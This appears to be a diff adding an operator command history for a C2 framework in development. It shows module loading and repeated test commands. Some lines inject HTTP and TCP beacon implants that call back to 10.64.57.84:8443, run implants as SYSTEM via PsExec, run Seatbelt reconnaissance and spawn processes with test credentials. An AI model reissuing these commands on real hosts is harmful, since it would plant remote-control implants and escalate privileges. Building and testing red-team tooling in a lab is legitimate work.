@@ -1,0 +1,503 @@
+assemblyExec
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+sleep 1
+assemblyExec test
+assemblyExec -d -i ./Seatbelt.exe -a -group=system
+run ls
+assemblyExec -d -i ./Seatbelt.exe
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Run.dll
+run ls
+run ls
+run dir
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+sleep 1
+inject
+inject -d i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/calc.exe
+inject -d -i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/calc.exe
+inject -d -i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/calc.exe -p 3436
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+assemblyExec
+assemblyExec -d -i ./Seatbelt.exe
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Run.dll
+run ls
+sleep 2
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Run.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+sleep 1
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe whoami
+assemblyExec /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin whoami
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin whoami
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/loader.bin
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe sleep 10
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe -1 sleep 10
+inject -r power.bin
+inject -r power.bin -1
+inject -e ./calc.exe -1
+inject -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe -1
+assemblyExe -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/BeaconHttpDll.dll -1 go 10.64.57.84 8443 https
+unloadModule inject
+loadModule Inject.dll
+inject
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/BeaconHttpDll.dll -1 go 10.64.57.84 8443 https
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/BeaconHttpDll.dll -1 go 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe -1
+loadModule Inject.dll
+sleep 1
+inject -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe -1
+unloadModule inject
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.ddl
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe -1
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/BeaconHttpDll.dll -1 go 10.64.57.84 8443 https
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/BeaconHttp.exe 10.64.57.84 8443 https
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe -1 sleep 50
+assemblyExec -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe sleep 50
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.sll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+assemblyExec -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe sleep 50
+assemblyExec -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe "-c sleep 50"
+assemblyExec -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe 
+assemblyExec -d /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/calc.exe
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe whoami
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+inject -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin -1
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+inject -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin -1
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe calc
+inject -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin -1
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/powershell.exe calc
+sleep 1
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+assemblyExec -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin
+inject -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin toto
+inject -r /home/mdecaumiabaillenx/Challenge/ExplorationC2/build/bin/power.bin -1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+sleep 1
+powershell
+powershell toto
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell toto
+powershell Get-Process\n
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell whoami
+powershell whoami
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell whoami
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+sleep 1
+powershell whoami
+powershell whoami
+powershell whoami
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell whoami
+powershell dir
+powershell pwd
+powershell import-module .\test.ps1
+powershell import-module .\test.ps1
+powershell Put-HelloWordl
+powershell unload-module test.ps1
+powershell import-module .\test.ps1
+powershell import-module .\test2.ps1
+powershell Put-HelloWordl
+powershell .\test.ps1
+Put-HelloWordl
+powershell Put-HelloWordl
+powershell .\test.ps1
+powershell Put-HelloWordl
+Get-ChildItem -Path Function:\Put-HelloWordl
+powershell Get-ChildItem -Path Function:\Put-HelloWordl
+powershell . .\test.ps1
+powershell Get-ChildItem -Path Function:\Put-HelloWordl
+powershell Put-HelloWordl
+powershell . .\test.ps1
+powershell Get-ChildItem -Path Function:\Put-HelloWordl
+powershell $toto=85644
+powershell $toto=85644; Write-Output $toto
+powershell Write-Output $toto
+powershell . .\test.ps; Get-ChildItem -Path Function:\Put-HelloWordl
+powershell . .\test.ps; Get-ChildItem -Path Function:\Put-HelloWordl;
+powershell . .\test.ps1; Get-ChildItem -Path Function:\Put-HelloWordl;
+powershell Get-ChildItem -Path Function:\Put-HelloWordl;
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell Get-ChildItem -Path Function:\Put-HelloWordl;
+powershell . .\test.ps1; Get-ChildItem -Path Function:\Put-HelloWordl;
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell . .\test.ps1; Get-ChildItem -Path Function:\Put-HelloWordl;
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell . .\test.ps1; Get-ChildItem -Path Function:\Put-HelloWordl;
+powershell whoami
+powershell . .\test.ps1; Get-ChildItem -Path Function:\Put-HelloWordl;
+powershell whoami;
+powershell hostname;
+powershell . .\test.ps1
+powershell . .\test.ps1
+powershell . .\test.ps1
+powershell hostname;
+powershell write-host hostname;
+powershell write-host $hostname;
+powershell $hostname=hsotname;write-host $hostname;
+powershell $hostname=hostname;write-host $hostname;
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell $hostname=hostname;write-host $hostname;
+powershell whoami
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell whoamig
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell whoami
+powershell sleep 15
+powershell sleep 5
+powershell sleep 10
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -accepteula -nobanner calc.exe
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject  -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner calc.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner calc.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s cmd
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s cmd.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s C:\Windows\System32\cmd.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner C:\Windows\System32\cmd.exe
+loadModule Inject.dll
+sleep 1
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner C:\Windows\System32\cmd.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe "10.64.57.84 8443 https"
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -1 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+loadModule Inject.dll
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+sleep 1
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner calc.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe 10.64.57.84 8443 https
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 /s Y:\ExplorationC2\buildWindows\bin\BeaconHttp.exe "10.64.57.84 8443 https"
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Inject.dll
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+sleep 1
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4  -accepteula -nobanner /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+inject -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -4 -accepteula -nobanner /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/AssemblyExec.dll
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -accepteula -nobanner /s Y:\ExplorationC2\loaders\PeLoader\implant.exe
+listener start 127.0.0.1 4444
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -accepteula -nobanner /s Y:\ExplorationC2\buildWindows\bin\BeaconTcp.exe 127.0.0.1 4444
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -accepteula -nobanner Y:\ExplorationC2\buildWindows\bin\BeaconTcp.exe 127.0.0.1 4444
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/PsExec64.exe -accepteula -nobanner /s /h Y:\ExplorationC2\buildWindows\bin\BeaconTcp.exe 127.0.0.1 4444
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/powershell.exe calc.exe
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/PsExec/powershell.exe calc.exe
+slee 1
+sleep 1
+loadModule AssemblyExec.dll/home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/Powershell.dll
+powershell
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.p
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+unloadModule powershell
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Powershell.dll
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/testModule.ps1-
+powershell Get-IPAddress
+powershell -i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/testModule.ps1
+powershell Get-IPAddress
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell Get-IPAddress
+powershell test
+powershell Get-IPAddress
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -s /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/bin/test.ps1
+powershell -i /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/testModule.ps1
+powershell Get-IPAddress
+loadModule Run.dll
+run whoami
+sleep 1
+loadModule Run.dll
+loadModule AssemblyExec.dll
+run whoami
+loadModule Run.dll
+run whoami
+sleep 1
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.lib
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run calc
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+sleep 1
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+run whoadf
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+run whoamidfg
+run Y:\ExplorationC2\testsModules\other\Seatbelt.exe
+loadModule AssemblyExec.dll
+run Y:\ExplorationC2\testsModules\other\Seatbelt.exe -group=system
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+sleep 1
+run whoamidfg
+run whoami
+run Y:\ExplorationC2\testsModules\other\Seatbelt.exe -group=system
+run timeout 2
+run timeout 5
+run mkdir C:\Users\dev\Desktop\toto
+run mkdir toto
+run ping 127.0.0.1
+unloadModule run
+run Y:\ExplorationC2\testsModules\other\Seatbelt.exe -group=system
+loadModule Run.dll
+run dir
+run ls
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run ls
+run dir
+run dir.exe
+run whoami
+run cmd /c whoami
+run cmd /c dir
+run cmd /c whoifgf
+run calc
+run notepad
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run calc
+sleep 1
+run notepad
+unloadModule run
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+sleep 1
+run notepad
+run whoami
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run whoami
+run dir
+run cmd /cdir
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+run cmd /c dir
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+run dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+run dir
+run cmd /c dir
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+sleep 1
+run notepad
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+run cmd /c dir
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+sleep 1
+run cmd /c dir
+run notepad
+sleep 1
+run cmd /c dir
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run notepad
+ls
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+run cmd /c dir
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+unloadModule run
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/Run.dll
+run cmd /c dir
+run notepad
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/AssemblyExec.dll
+assemblyExec -e /opt/tools/Seatbelt.exe -group=system
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/Seatbelt.exe -group=system
+assemblyExec -e /home/mdecaumiabaillenx/Challenge/ExplorationC2/testsModules/other/Seatbelt.exe -group=system
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+sleep 1
+spawnAs
+spawnAs ./dev root
+spawnAs dev root
+unloadModule spawnAs
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+unloadModule spawnAs
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+sleep 1
+spawnAs evil evil123!
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+spawnAs evil evil123!
+sleep 1
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+unloadModule spawnAs
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+spawnAs evil evil123!
+loadModule /home/mdecaumiabaillenx/Challenge/ExplorationC2/buildWindows/src/modules/Release/SpawnAs.dll
+sleep 1
+spawnAs evil evil123!
+spawnAs evil evil123!
